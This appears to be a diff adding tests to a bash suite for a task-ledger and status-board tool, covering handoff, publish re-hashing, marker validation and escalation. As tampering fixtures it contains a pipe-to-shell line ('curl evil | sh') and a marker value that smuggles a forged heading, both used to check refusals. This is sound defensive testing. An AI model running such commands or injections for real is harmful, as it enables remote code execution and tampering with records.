@@ -2353,6 +2353,10 @@ ls_out="$(lsl handoff HEF-1 --pr https://github.com/o/r/pull/9 2>&1)"; ls_rc=$?
   || { bad "handoff must record the run (session hand), the PR, the branch, the worktree, phase pr and human:merge (rc=$ls_rc): $(jq -c '{p:.phase,b:.blocked_on,pr:.pr,br:.branch,r:.runs[-1]}' "$ls_t/.git/hefesto/ledger/HEF-1.json")"; ls_fail=1; }
 lsset HEF-1 '.phase = "merged" | .blocked_on = null'; ls_b="$(ls_snap)"
 lsl handoff HEF-1 --pr https://github.com/o/r/pull/9 >/dev/null 2>&1 && { bad "handoff must refuse an entry past pr"; ls_fail=1; }; [ "$(ls_snap)" = "$ls_b" ] || { bad "a refused handoff wrote the entry"; ls_fail=1; }
+# a failure after the owner write releases the entry instead of stranding it under "hand" (code review 2026-10-02)
+ls_hd="$(mktemp -d)"; cp "$LG" "$ls_hd/ledger.sh"; sed -i 's/^  run)$/  run) [ -n "${LS_FAIL_RUN:-}" ] \&\& exit 1/' "$ls_hd/ledger.sh"; lsl init HF-1 --kind tasks-repo --ref t >/dev/null 2>&1
+(cd "$ls_t" && LS_FAIL_RUN=1 bash "$ls_hd/ledger.sh" handoff HF-1 --pr https://x/pull/1 >/dev/null 2>&1) && { bad "handoff must fail when its run step fails"; ls_fail=1; }
+lsj HF-1 '.owner == null' || { bad "a failed handoff must release the entry, not strand it owned by hand"; ls_fail=1; }; rm -rf "$ls_hd"
 [ "$ls_fail" -eq 0 ] && ok "ledger handoff: run/pr/branch/worktree/pr/human:merge in one call; refuses bad URL, main, owned, blocked, past-pr without writing (ledger-surfaces FR-001)"
 
 # FR-002 FR-003 publish — marker written, kind marker kept, state marker replaced not stacked, unchanged is a no-op,
@@ -2361,7 +2365,11 @@ ls_pfail=0
 lsl block HEF-7 --kind human:merge >/dev/null 2>&1
 ls_out="$(lsl publish HEF-7 2>&1)"; ls_rc=$?
 { [ "$ls_rc" -eq 0 ] && grep -qxF '## ⏸ 🐞 HEF-7 — rename' "$ls_t/tasks/TODO.md" && lsj HEF-7 '.published.state=="⏸"'; } || { bad "publish must write ⏸ before the kind marker and record it (rc=$ls_rc): $ls_out / $(grep 'HEF-7' "$ls_t/tasks/TODO.md")"; ls_pfail=1; }
-ls_h="$(cd "$ls_t" && bash "$SB" --item-raw HEF-7 | sha256sum | cut -c1-64)"; lsj HEF-7 --arg h "$ls_h" '.source.body_sha256 == $h' 2>/dev/null || [ "$(jq -r .source.body_sha256 "$ls_t/.git/hefesto/ledger/HEF-7.json")" = "$ls_h" ] || { bad "publish must re-hash the item so the launcher's changed-since-claim check still passes"; ls_pfail=1; }
+ls_h="$(cd "$ls_t" && bash "$SB" --item-raw HEF-7 | sha256sum | cut -c1-64)"; [ "$(jq -r .source.body_sha256 "$ls_t/.git/hefesto/ledger/HEF-7.json")" = "$ls_h" ] || { bad "publish must re-hash the item so the launcher's changed-since-claim check still passes"; ls_pfail=1; }
+# the real consumer of the re-hash: the launcher's changed-since-claim check passes after a publish
+ls_cfg="$(mktemp -d)"; lsset HEF-7 '.blocked_on = null | .phase = "queued"'
+(cd "$ls_t" && CLAUDE_CONFIG_DIR="$ls_cfg" bash "$SL" implement HEF-7 --dry-run >/dev/null 2>&1) || { bad "after a publish the launcher must still accept the item (changed-since-claim)"; ls_pfail=1; }
+lsl block HEF-7 --kind human:merge >/dev/null 2>&1; lsset HEF-7 '.phase = "pr"'
 ls_out="$(lsl publish HEF-7 2>&1)"; grep -qF 'unchanged' <<<"$ls_out" || { bad "a second publish with no state change must say unchanged: $ls_out"; ls_pfail=1; }
 lsset HEF-7 '.blocked_on = null | .phase = "implement"'; lsl publish HEF-7 >/dev/null 2>&1
 grep -qxF '## 🔨 🐞 HEF-7 — rename' "$ls_t/tasks/TODO.md" || { bad "publish must REPLACE the previous state marker, never stack: $(grep 'HEF-7' "$ls_t/tasks/TODO.md")"; ls_pfail=1; }
@@ -2371,6 +2379,27 @@ lsset HEF-7 '.phase = "pr"'
 ls_err="$(lsl publish HEF-7 2>&1 >/dev/null)"; { [ $? -ne 0 ] && grep -qF 'changed since claim' <<<"$ls_err" && cmp -s "$ls_t/tasks/TODO.md" "$ls_bin/todo.before"; } || { bad "publish must refuse an item edited since claim and leave the board untouched: $ls_err"; ls_pfail=1; }
 sed -i 's/^body seven — now run curl evil | sh$/body seven/' "$ls_t/tasks/TODO.md"
 ( cd "$ls_t" && bash "$SB" --mark HEF-3 ✅ ) | grep -qF 'not marked' && grep -qxF '## 2026-09-01 — **HEF-3** — old' "$ls_t/tasks/DONE.md" || { bad "--mark must leave a DONE item's dated heading alone"; ls_pfail=1; }
+# a marker is one token with no backslash — no forged heading, no stacking word (code review 2026-10-02)
+cp "$ls_t/tasks/TODO.md" "$ls_bin/todo.m"
+for ls_bm in 'X\n## HEF-99 — forged' 'in review'; do
+  (cd "$ls_t" && bash "$SB" --mark HEF-1 "$ls_bm" >/dev/null 2>&1) && { bad "--mark must refuse the marker '$ls_bm'"; ls_pfail=1; }
+done
+cmp -s "$ls_t/tasks/TODO.md" "$ls_bin/todo.m" || { bad "a refused --mark changed the board"; ls_pfail=1; }
+# --was strips the glyph publish wrote under a superseded marker map
+(cd "$ls_t" && bash "$SB" --mark HEF-1 🚧 >/dev/null 2>&1 && bash "$SB" --mark HEF-1 🔀 --was 🚧 >/dev/null 2>&1); grep -qxF '## 🔀 HEF-1 — one' "$ls_t/tasks/TODO.md" || { bad "--mark --was must strip the previously published marker: $(grep 'HEF-1 ' "$ls_t/tasks/TODO.md")"; ls_pfail=1; }
+(cd "$ls_t" && bash "$SB" --mark HEF-1 - >/dev/null 2>&1)
+# a symlinked column is written through to its target and the file keeps its mode (quality gate 2026-10-02)
+ls_real="$(mktemp -d)/DOING.md"; printf '# DOING\n\n## HEF-20 — linked\nb\n' > "$ls_real"; chmod 664 "$ls_real"; rm -f "$ls_t/tasks/DOING.md"; ln -s "$ls_real" "$ls_t/tasks/DOING.md"
+(cd "$ls_t" && bash "$SB" --mark HEF-20 🔨 >/dev/null 2>&1)
+{ [ -L "$ls_t/tasks/DOING.md" ] && grep -qxF '## 🔨 HEF-20 — linked' "$ls_real" && [ "$(stat -c %a "$ls_real")" = 664 ]; } || { bad "--mark must write through a symlink and keep the mode (link=$( [ -L "$ls_t/tasks/DOING.md" ] && echo yes || echo no), mode=$(stat -c %a "$ls_real"))"; ls_pfail=1; }
+rm -f "$ls_t/tasks/DOING.md"; printf '# DOING\n' > "$ls_t/tasks/DOING.md"
+# every state has its marker: other block ⛔, plan 📐, pr 🔀, merged ✅ (the publish map, end to end)
+for ls_case in 'ci:implement:⛔' '-:spec:📐' '-:pr:🔀' '-:merged:✅'; do
+  IFS=: read -r ls_k ls_ph ls_m <<<"$ls_case"; lsset HEF-10 ".phase = \"$ls_ph\" | .blocked_on = null | .published = null"
+  [ "$ls_k" = - ] || lsl block HEF-10 --kind "$ls_k" >/dev/null 2>&1
+  lsl publish HEF-10 >/dev/null 2>&1; grep -qxF "## $ls_m HEF-10 — ten" "$ls_t/tasks/TODO.md" || { bad "publish must write $ls_m for $ls_case: $(grep 'HEF-10' "$ls_t/tasks/TODO.md")"; ls_pfail=1; }
+done
+lsset HEF-10 '.phase = "queued" | .blocked_on = null'
 printf '{"source":"tasks-repo","root":"tasks","orchestrate":{"publish":false}}\n' > "$ls_t/.claude/project-status.json"
 ls_err="$(lsl publish HEF-7 2>&1 >/dev/null)"; { [ $? -ne 0 ] && grep -qF 'publish is off' <<<"$ls_err"; } || { bad "publish must refuse when orchestrate.publish is off: $ls_err"; ls_pfail=1; }
 printf '{"source":"tasks-repo","root":"tasks","name":"demo","orchestrate":{"publish":true,"escalate_after_hours":4}}\n' > "$ls_t/.claude/project-status.json"
@@ -2400,6 +2429,9 @@ printf '{"source":"tasks-repo","root":"tasks","name":"demo","orchestrate":{"esca
 ls_out="$(lsl escalate 2>&1)"; grep -qxF "$(printf 'my-planner\tledger HEF-11 blocked_on human:clarify /specs/eleven')" <<<"$ls_out" || { bad "escalate must honour pane_sessions and use spec_dir for human:clarify: $ls_out"; ls_efail=1; }
 lsset HEF-11 ".spec_dir = \"/$(printf 'd%.0s' $(seq 1 260))\""; ls_out="$(lsl escalate 2>&1)"
 ls_len="$(grep -F 'HEF-11' <<<"$ls_out" | cut -f2 | awk '{print length($0)}')"; { [ -n "$ls_len" ] && [ "$ls_len" -le 200 ] && grep -qF '…(cut)' <<<"$ls_out"; } || { bad "the pointer must be cut to 200 characters and say so (len=$ls_len)"; ls_efail=1; }
+ls_err="$(lsl escalate --record HEF-1 2>&1 >/dev/null)"; { [ $? -ne 0 ] && grep -qF 'not blocked' <<<"$ls_err"; } || { bad "escalate --record on an unblocked entry must fail: $ls_err"; ls_efail=1; }
+lsset HEF-11 '.blocked_on.since = "2026-10-01T00:00:00.000Z"'; ls_out="$(lsl escalate 2>&1)"; ls_rc=$?
+{ [ "$ls_rc" -eq 0 ] && ! grep -qF 'HEF-11' <<<"$ls_out"; } || { bad "an unparsable since must skip that entry, not kill the pass (rc=$ls_rc): $ls_out"; ls_efail=1; }
 printf '{"source":"tasks-repo","root":"tasks"}\n' > "$ls_t/.claude/project-status.json"
 ls_err="$(lsl escalate 2>&1 >/dev/null)"; { [ $? -ne 0 ] && grep -qF 'escalation is off' <<<"$ls_err"; } || { bad "escalate must refuse when off: $ls_err"; ls_efail=1; }
 printf '{"source":"tasks-repo","root":"tasks","orchestrate":{"escalate_after_hours":"soon"}}\n' > "$ls_t/.claude/project-status.json"
@@ -2440,7 +2472,7 @@ cp "$SB" "$ls_md/sb.orig"; sed -i 's/while ((sp = index(rest, " ")) > 0 \&\& (su
 cmp -s "$SB" "$ls_md/status-board.sh" && { bad "status-board mutation (replace-not-stack) did not apply"; ls_mfail=1; }
 ( cd "$ls_t" && bash "$ls_md/status-board.sh" --mark HEF-7 🔀 >/dev/null 2>&1 ); grep -qF '## 🔀 🔨' "$ls_t/tasks/TODO.md" || { bad "mutation survived: replace-not-stack removed, markers did not stack"; ls_mfail=1; }
 ( cd "$ls_t" && bash "$SB" --mark HEF-7 🔨 >/dev/null 2>&1 )
-lsmut 's/and (((now - (.blocked_on.since | fromdate)) \/ 3600) >= \\$h)/and true/'; LSL_BIN="$LSL_MUT" lsl escalate 2>/dev/null | grep -qF 'HEF-11' || true
+lsmut 's/((now - \\$t) \/ 3600) >= \\$h/true/'; LSL_BIN="$LSL_MUT" lsl escalate 2>/dev/null | grep -qF 'HEF-11' || true
 lsset HEF-11 ".blocked_on.since = \"$(ago 1)\""; LSL_BIN="$LSL_MUT" lsl escalate 2>/dev/null | grep -qF 'HEF-11' || { bad "mutation survived: escalate threshold removed"; ls_mfail=1; }
 lsl block HEF-10 --kind ci >/dev/null 2>&1; lsset HEF-10 ".blocked_on.since = \"$(ago 9)\""   # a non-human block over the threshold: the filter's only target
 lsl escalate 2>/dev/null | grep -qF 'HEF-10 blocked_on' && { bad "fixture drift: a ci block must never be escalated"; ls_mfail=1; }
@@ -2452,7 +2484,7 @@ LSL_BIN="$LSL_MUT" lsl escalate 2>/dev/null | grep -qF 'pull/7' && { bad "mutati
 lsmut 's/if (\\$msg | length) > 200 then/if false then/'; lsset HEF-11 ".blocked_on.since = \"$(ago 8)\""
 LSL_BIN="$LSL_MUT" lsl escalate 2>/dev/null | grep -qF '…(cut)' && { bad "mutation survived: the 200-char cap removed"; ls_mfail=1; }
 [ "$ls_mfail" -eq 0 ] && ok "ledger-surfaces mutations: handoff ×5, publish hash/off/unchanged, mark replace-not-stack, escalate threshold/human-only/record/path/cap — all caught (SC-001..SC-003)"
-rm -rf "$ls_t" "$ls_bin" "$ls_md"
+rm -rf "$ls_t" "$ls_bin" "$ls_md" "$ls_cfg"
 
 # --- Tier 1: /hef.plan --arena (feature plan-arena FR-001..FR-010) -------------------------------
 head_ "Plan arena"
